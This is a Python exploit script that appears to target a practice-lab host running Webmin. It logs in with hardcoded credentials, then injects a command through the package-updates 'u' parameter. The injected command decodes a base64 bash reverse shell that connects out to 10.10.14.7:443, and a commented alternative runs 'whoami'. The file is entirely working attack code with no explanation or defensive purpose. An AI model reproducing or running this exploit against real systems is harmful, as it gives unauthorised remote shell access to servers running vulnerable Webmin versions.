#!/usr/bin/python3

import requests
import urllib3



if __name__ == "__main__":
    

    post_url = "https://10.10.10.160:10000/session_login.cgi"
    update_url = "https://10.10.10.160:10000/package-updates/update.cgi"
    urllib3.disable_warnings()
    sess = requests.Session()
    sess.verify = False 
    
    data_post = {
        "user":"Matt",
        "pass":"computer2008"
    }
    
    headers = {
        "Cookie":"redirect=1; testing=1; sid=x"
    }
    
    ress = sess.post(url=post_url,
                     data=data_post, headers=headers)
    
    
    # now trying to get remote code execution
    new_post_data = [('u', 'acl/apt'), ('u', ' | bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0MyAwPiYx | base64 -d | bash"'), ('ok_top', 'Update Selected Packages')]
    # new_post_data = [('u', 'acl/apt'), ('u', ' | bash -c whoami'), ('ok_top', 'Update Selected Packages')]
    new_headers = {
        "Referer":"https://10.10.10.160:10000/package-updates/?xnavigation=1"
    }
    
    update = sess.post(url=update_url, data=new_post_data, headers=new_headers)
    
    print(update.text)